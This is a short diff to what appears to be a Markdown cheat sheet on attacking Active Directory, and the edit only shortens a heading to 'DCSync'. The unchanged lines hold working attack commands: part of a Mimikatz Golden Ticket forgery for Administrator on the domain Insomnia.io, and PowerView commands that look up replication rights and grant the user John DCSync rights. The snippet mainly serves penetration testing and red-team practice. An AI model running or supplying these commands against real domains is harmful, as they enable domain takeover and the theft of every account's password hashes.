@@ -69,8 +69,7 @@ kerberos::golden /user:Administrator /domain:Insomnia.io /sid:S-1-5-21-386582369
 
 ```
 
-### DCSync Enumeration and Execution
-
+### DCSync 
 ```
 Get-ObjectAcl -DistinguishedName "dc=insomnia,dc=io" -ResolveGUIDs | ? {($_.IdentityReference -match "John") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
 Add-ObjectAcl -TargetDistinguishedName "dc=insomnia,dc=io" -PrincipalSamAccountName John -Rights DCSync 
